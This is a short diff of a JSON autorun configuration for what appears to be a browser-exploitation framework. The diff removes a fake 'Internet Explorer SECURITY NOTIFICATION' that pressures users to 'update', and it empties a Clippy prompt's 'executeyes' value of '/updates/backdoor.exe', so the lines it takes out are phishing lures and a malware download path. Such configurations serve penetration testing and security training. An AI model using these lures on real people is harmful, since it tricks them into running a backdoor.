@@ -4,21 +4,14 @@
   "browser": "ALL",
   "modules": [
     {
-      "name": "fake_notification",
-      "condition": null,
-      "options": {
-        "notification_text":"Internet Explorer SECURITY NOTIFICATION: your browser is outdated and vulnerable to critical security vulnerabilities like CVE-2015-009 and CVE-2014-879. Please update it."
-      }
-    }
-  ,{
       "name": "clippy",
       "condition": null,
       "options": {
         "clippydir": "/clippy/",
         "askusertext": "Hello there, enjoying the weather?",
-        "executeyes": "/updates/backdoor.exe",
+        "executeyes": "",
         "respawntime":"5000",
-        "thankyoumessage":"I don't actually work here, but thanks for stopping by."
+        "thankyoumessage":"I don't actually work here."
       }
     }
   ],
